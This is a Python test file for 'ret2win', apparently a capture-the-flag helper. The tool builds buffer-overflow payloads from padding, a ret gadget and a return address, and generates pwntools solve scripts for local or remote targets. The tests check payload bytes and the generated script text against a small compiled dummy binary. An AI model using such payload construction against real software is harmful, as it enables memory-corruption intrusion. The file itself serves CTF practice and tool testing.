"""
tests/test_core.py - Tests for payload building, address parsing, and script generation.
"""

import unittest
from pwn import p32, p64
from ret2win.core import (
    parse_address,
    build_payload,
    format_payload_breakdown,
    format_colorized_hexdump,
    generate_solve_script,
)


class TestCore(unittest.TestCase):
    def test_parse_address_hex_string(self):
        self.assertEqual(parse_address("0x401196"), 0x401196)
        self.assertEqual(parse_address("401196"), 0x401196)
        self.assertEqual(parse_address("0XCAFE"), 0xCAFE)

    def test_parse_address_hex_without_prefix(self):
        self.assertEqual(parse_address("401196"), 0x401196)

    def test_parse_address_decimal_small(self):
        self.assertEqual(parse_address("42"), 42)
        self.assertEqual(parse_address("100"), 100)

    def test_parse_address_symbol_lookup(self):
        symbols = {"win": 0x401196, "flag": 0x401200}
        self.assertEqual(parse_address("win", symbols=symbols), 0x401196)
        self.assertEqual(parse_address("flag", symbols=symbols), 0x401200)

    def test_parse_address_invalid(self):
        with self.assertRaises(ValueError):
            parse_address("nonexistent_symbol", symbols={"main": 0x401000})

    def test_build_payload_64bit_no_align(self):
        offset = 40
        win_addr = 0x401196
        payload = build_payload(offset=offset, win_addr=win_addr, bits=64, align=False)
        expected = b"A" * offset + p64(win_addr)
        self.assertEqual(payload, expected)
        self.assertEqual(len(payload), 48)

    def test_build_payload_64bit_with_align(self):
        offset = 40
        win_addr = 0x401196
        ret_gadget = 0x40101A
        payload = build_payload(offset=offset, win_addr=win_addr, bits=64, align=True, ret_gadget=ret_gadget)
        expected = b"A" * offset + p64(ret_gadget) + p64(win_addr)
        self.assertEqual(payload, expected)
        self.assertEqual(len(payload), 56)

    def test_build_payload_32bit(self):
        offset = 32
        win_addr = 0x080484B6
        payload = build_payload(offset=offset, win_addr=win_addr, bits=32, align=False)
        expected = b"A" * offset + p32(win_addr)
        self.assertEqual(payload, expected)
        self.assertEqual(len(payload), 36)

    def test_format_payload_breakdown(self):
        payload, table = format_payload_breakdown(
            offset=40, win_addr=0x401196, bits=64, align=True, ret_gadget=0x40101A
        )
        self.assertIsNotNone(payload)
        self.assertIsNotNone(table)
        self.assertEqual(len(payload), 56)

    def test_format_colorized_hexdump(self):
        payload = b"A" * 40 + p64(0x40101A) + p64(0x401196)
        text = format_colorized_hexdump(payload, offset=40, has_align=True, bits=64, ret_gadget=0x40101A)
        self.assertIsNotNone(text)
        self.assertIn("0000:", str(text))

    def test_generate_solve_script_local(self):
        script = generate_solve_script(
            binary_path="./vuln",
            offset=40,
            win_addr=0x401196,
            bits=64,
            align=False,
            remote_target=None,
            input_mode="stdin"
        )
        self.assertIn("from pwn import *", script)
        self.assertIn("offset = 40", script)
        self.assertIn("win_addr = 0x401196", script)
        self.assertIn("io = process(binary_path", script)

    def test_generate_solve_script_remote(self):
        script = generate_solve_script(
            binary_path="./vuln",
            offset=40,
            win_addr=0x401196,
            bits=64,
            align=True,
            ret_gadget=0x40101A,
            remote_target=("10.10.10.42", 1337),
            input_mode="stdin"
        )
        self.assertIn("from pwn import *", script)
        self.assertIn("io = remote('10.10.10.42', 1337)", script)
        self.assertIn("ret_gadget = 0x40101a", script)


    def test_analyze_binary_with_fixture(self):
        import shutil
        import tempfile
        import subprocess
        import os
        from ret2win.core import analyze_binary

        if not shutil.which("gcc") and not shutil.which("clang"):
            self.skipTest("C compiler not available for dummy ELF fixture")

        cc = shutil.which("gcc") or shutil.which("clang")
        with tempfile.TemporaryDirectory() as tmpdir:
            c_src = os.path.join(tmpdir, "vuln.c")
            bin_path = os.path.join(tmpdir, "vuln")
            with open(c_src, "w") as f:
                f.write(
                    '#include <stdio.h>\n'
                    'void win() { puts("flag"); }\n'
                    'int main() { return 0; }\n'
                )
            res = subprocess.run([cc, "-no-pie", c_src, "-o", bin_path], capture_output=True)
            if res.returncode != 0:
                # Some compilers on specific arches might not support -no-pie
                res = subprocess.run([cc, c_src, "-o", bin_path], capture_output=True)
            if res.returncode != 0 or not os.path.isfile(bin_path):
                self.skipTest("Could not compile dummy test ELF binary")

            analysis = analyze_binary(bin_path)
            self.assertIn("bits", analysis)
            self.assertIn("arch", analysis)
            self.assertIn("nx", analysis)
            self.assertIn("candidates", analysis)
            candidate_names = [c["name"] for c in analysis["candidates"]]
            self.assertIn("win", candidate_names)


if __name__ == "__main__":
    unittest.main()
